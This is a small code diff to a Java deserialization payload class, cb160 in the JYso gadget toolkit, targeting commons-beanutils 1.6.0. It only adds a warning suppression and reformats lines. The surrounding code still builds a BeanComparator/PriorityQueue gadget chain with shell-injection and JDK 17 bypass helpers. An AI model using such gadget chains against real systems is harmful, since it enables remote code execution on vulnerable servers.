@@ -13,6 +13,7 @@ import java.util.PriorityQueue;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;
 
+@SuppressWarnings("rawtypes")
 @Dependencies({"commons-beanutils:commons-beanutils:1.6.0"})
 public class cb160 implements ObjectPayload<Object> {
 
@@ -25,9 +26,9 @@ public class cb160 implements ObjectPayload<Object> {
         insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = 2573799559215537819;");
 
 
-        Class                       beanCompareClazz = ctClass.toClass();
-        BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
-        final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
+        Class<?> beanCompareClazz = ctClass.toClass();
+        BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add("1");
         queue.add("1");
 
